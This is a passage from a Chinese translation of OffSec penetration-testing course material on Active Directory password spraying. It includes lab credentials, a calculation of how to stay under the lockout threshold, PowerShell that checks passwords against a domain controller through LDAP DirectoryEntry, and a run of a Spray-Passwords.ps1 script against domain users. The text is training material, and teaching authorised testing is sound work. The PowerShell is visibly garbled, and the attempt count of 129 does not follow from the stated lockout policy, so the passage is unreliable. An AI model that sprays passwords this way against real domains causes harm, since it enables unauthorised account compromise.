

在上一个单元中，我们讨论了 NTLM 和 Kerberos 认证，以及我们可以在哪里找到缓存的 AD 凭据和对象。在本单元中，我们将探索在这些认证机制背景下的各种攻击。这些攻击技术是相互独立介绍的，因为它们可以被用于渗透测试的多个阶段。对于大多数攻击，我们还将讨论如何在 Windows 和 Linux 上同样执行这些攻击的方法，这使我们更加灵活，并能够适应各种现实世界的场景。

## 22.2.1 密码攻击

在之前的一个模块中，我们检查了针对网络服务和哈希信息的几种密码攻击。在 AD 环境下，密码攻击也是获取用户凭据的一种可行选择。在节节中，我们将探索各种 AD 密码攻击。

在探索这些攻击之前，我们需要考虑一个重要的因素。在执行暴力破解或字典列表身份验证攻击时，我们必须意识到**账户锁定**（account lockouts）的风险。许多系统可能会因为攻击而锁定账户，并可能向系统管理员发出警告。

为了了解更多关于账户锁定的信息，让我们查看 CLIENT75 上用户 jeff 的账户域策略。我们可以通过 RDP 使用密码 HenchmanPutridBonbon11 连接到系统。接下来，我们打开一个 PowerShell 窗口并执行 `net accounts` 来获取账户策略。

```
PS C:\Users\jeff>
Force user logoff long after time expires?: Never
Minimum password age (days): 1
Maximum password age (days): 42
Minimum password length: 7
Length of password history maintained: 24
Lockout threshold: 5
Lockout duration (minutes): 30
Lockout observation window (minutes): 30
Computer role: WORKSTATION
The command completed successfully.
```

列表 797 - net accounts 命令的结果

这里有很多非常有用的信息，但让我们首先关注一下**锁定阈值**（Lockout threshold），它表示在锁定之前失败登录的次数限制。这意味着我们可以在触发锁定之前尝试四次登录。这看起来可能并不多，我们还应该考虑**锁定观察窗口**（Lockout observation window），它表示在最后一次登录三十分钟后，我们可以进行额外的尝试。

通过这些设置，在假设实际用户不再登录的情况下，我们可以在 24 小时内对每个域尝试 129 次登录而不会触发锁定。

这种攻击可能包括编译一个非常常用密码的短列表，并利用它针对大量用户。有时这种攻击可以揭示组织中的几个弱点账户密码。

# 使用 Kali Linux 进行 OffSec 渗透测试

然而，这将产生巨大的流量。让我们回顾三种在 AD 环境中成功概率更高的密码喷洒（password spraying）攻击。

第一种密码喷洒攻击使用 LDAP 和 ADSI 针对 AD 用户进行“低且慢”的密码攻击。在“Active Directory 简介与枚举”中，我们曾以登录用户的身份使用 `DirectoryEntry` 对域控制器执行查询。然而，我们也可以通过设置 `DirectoryEntry` 实例在不同用户的上下文中进行查询。

在“Active Directory 简介与枚举”模块中，我们可以提供三个参数，但我们可以使用指向控制器的 LDAP 路径、用户名和密码：

```
PS C:\Users\$domainObj = [System.DirectoryServices.ActiveDirectoryDomain]::GetCurrentDomain()
PS C:\Users\$PDC = ($domainObj.PDCOwner)
PS C:\Users\$SearchString = "LDAP://"
PS C:\Users\$SearchString += $PDC + ""
PS C:\Users\$DistinguishedName = "DC=$($domainObj.Name.Replace('.','',DC=','))"
PS C:\Users\$SearchString += $DistinguishedName
PS C:\Users\$New-Object System.DirectoryServices.DirectoryEntry($SearchString,"pete","Nexus123!")
```

| 798 - 使用 DirectoryEntry 进行身份验证 |

如果密码正确，对象创建将成功，如列表 799 所示。

```
distinguishedName : (DC=corp,DC=com)
Path : LDAP://DC1.corp.com/DC=corp,DC=com
799 -成功通过 DirectoryEntry 身份验证
```

如果密码无效，将不会创建任何对象，我们将收到一个异常，如列表 800 所示。为了解决这个问题，让我们将构造函数中的密码改为 `WrongPassword`。我们会注意到提示显示用户名或密码错误。

```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect."
+ Category : Notified: (:) [format-default]
ExtendedTypeSystemException
+ FullyQualifiedId : 
CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
800 - 使用 DirectoryEntry 使用了错误的密码
```

1101 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry/view=dotnet-plat-ext-6.0

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# 使用 Kali Linux 进行 OffSec 渗透测试

我们可以使用这种技术创建一个 PowerShell 脚本，用于枚举所有用户并根据锁定阈值和锁定观察窗口执行身份验证。

这种密码喷洒策略已经实现在 CLIENT75 的 PowerShell 脚本 `C:\Tools\Spray-Passwords.ps1` 中。

`Pass` 选项允许我们设置单个密码，或者我们可以使用 `-File` 喷洒单词列表文件。我们还可以通过添加 `-Admin` 标志来测试账户。该 PowerShell 脚本会自动识别域用户并对他们喷洒密码

```
PS C:\Users\jeff cd C:\Tools\
PS C:\Tools>.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
...
```

